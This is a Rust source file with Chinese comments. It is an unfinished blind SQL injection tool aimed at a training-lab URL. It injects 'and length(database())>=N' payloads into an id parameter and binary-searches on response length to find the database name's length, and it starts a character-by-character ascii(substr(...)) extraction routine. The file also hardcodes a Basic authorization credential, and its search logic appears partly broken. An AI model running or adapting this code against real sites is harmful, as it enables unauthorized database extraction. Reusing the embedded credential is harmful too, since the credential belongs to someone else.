use reqwest::header;
pub use reqwest::Client;

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let client = Client::new();
    
    let mut db_len = 0;
    let url = String::from("http://qs664hs8.lab.aqlab.cn/Pass-10/index.php?id=1");
    let playload = " and length(database())".to_string();
    
    // 首先记录一次正常请求响应内容的长度
    let length = if let Ok(len) = get(&client, &url).await {
        len
    } else {
        0
    };
// 设置二分法查找条件，定数据库名长度不超过100
    let mut start = 0;
    let mut end = 100;
    let mut index = (end - start) / 2;
    loop {
        let mut new_playload = playload.clone() + ">=" + &index.to_string();
        let mut new_url = url.clone() + &new_playload;
        println!("{:?}", &new_url);
        if let Ok(len) = get(&client, &new_url).await {
            if length == len - new_playload.len() {
                // 说明真实长度应该大于等于当前的测试的长度
                // 测试是否是当前值，如果是则直接返回，不是则把end*2
                new_playload = playload.clone() + "=" + &index.to_string();
                new_url = url.clone() + &new_playload;
                if let Ok(len) = get(&client, &new_url).await {
                    if length == len - new_playload.len(){
                        println!("{:?}", &new_url);
                        db_len = index;
                        break;
                    } else {
                        start = index;
                        index = start + (end - start) / 2;
                    }
                    
                } 
            } else {
                // 说明小于end
                end = index;
                index = (end - start) / 2;
            }
        }
    }

// todo()! 在这里已经计算出数据库名的长度，接下来可以对数据库名进行爆破
    
    
    Ok(())
    
}


async fn get_db_name(len: usize, url: &String) -> Result<(), reqwest::Error> {
    let mut begin_index = 1;
    let compair = String::from(">");
    let mut playload = " and ascii(substr((select database()),".to_string() + &begin_index.to_string() +",1))";



    Ok(())
}




// get方法
async fn get(client: &Client, url: &str) -> Result<usize, reqwest::Error> {
    
    let response = client.get(url)
        // .form(&params)
        .header(header::HOST,"qs664hs8.lab.aqlab.cn")
        .header(header::USER_AGENT,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
        .header(header::AUTHORIZATION, "Basic emthcTp6a2Fx")
        .send()
        .await?
        .text()
        .await?;
    // 可以获取到响应长度
    let resp_len = response.len();
    // println!("返回长度为: {resp_len}");
    Ok(resp_len)
}